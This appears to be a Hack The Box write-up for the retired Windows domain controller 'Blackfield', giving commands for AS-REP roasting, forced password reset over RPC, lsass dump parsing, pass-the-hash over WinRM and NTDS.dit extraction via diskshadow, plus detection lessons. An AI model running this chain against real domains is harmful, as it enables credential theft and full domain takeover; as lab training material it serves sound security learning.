---
machine: Blackfield
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, as-rep-roast, smb, lsass, sebackupprivilege, ntds]
---

# Blackfield — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A domain controller with a Kerberos account lacking preauthentication: **AS-REP roasting** and cracking. That account can reset another user's password, which opens a forensic share holding an **lsass dump**; the `svc_backup` hash comes out of it and, with **SeBackupPrivilege**, `NTDS.dit` plus the SYSTEM hive are copied through a shadow copy up to the Administrator hash.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 5986, 9389
```

Domain `BLACKFIELD.local`. Enumerate users and check preauthentication:

```bash
impacket-GetADUsers -all -dc-ip <DC> blackfield.local/
nxc ldap <DC> -u '' -p '' --asreproast asrep.txt
```

## Initial access

```bash
impacket-GetNPUsers blackfield.local/ -no-pass -usersfile users.txt -dc-ip <DC> -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

`support` has no preauthentication and its password falls to a wordlist. With those credentials, enumerate SMB shares:

```bash
nxc smb <DC> -u support -p '<password>' --shares
```

`profiles$` is readable and `forensic` appears once another user's password is forced.

## From support to audit2020

`support` may reset `audit2020`'s password over RPC:

```bash
rpcclient -U 'support%<password>' <DC>
```

```text
setuserinfo2 audit2020 23 '<NewPassword>!'
```

`audit2020` opens the `forensic` share, which holds an `lsass.exe` memory dump. Download and parse it:

```bash
smbclient //<DC>/forensic -U 'audit2020%<NewPassword>!'
pypykatz lsa minidump lsass.DMP
```

The dump yields the `svc_backup` NT hash.

## Escalation to Domain Admin

`svc_backup` holds **SeBackupPrivilege** and WinRM access:

```bash
evil-winrm -i <DC> -u svc_backup -H <hash>
```

```powershell
whoami /priv
```

Create a shadow copy and copy the directory files:

```powershell
diskshadow /s script.txt
# script.txt:
# set context persistent nowriters
# add volume c: alias bk
# create
# expose %bk% z:
robocopy /b z:\windows\ntds . ntds.dit
robocopy /b z:\windows\system32\config . SYSTEM
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

The Administrator hash allows `wmiexec`/`psexec` and both flags.

## Lessons

- A Kerberos account without preauthentication hands out a crackable hash with no credentials: audit the `DONT_REQ_PREAUTH` flag.
- Password-reset rights over RPC are quiet lateral movement.
- An lsass dump on a "forensic" share is plaintext-grade credentials for anyone who can read it.
- `SeBackupPrivilege` equals full disk read: `diskshadow` sidesteps the NTDS.dit locks.
- Detection: bulk AS-REP requests, `setuserinfo2` from non-admin accounts, and `diskshadow`/`robocopy /b` over NTDS.
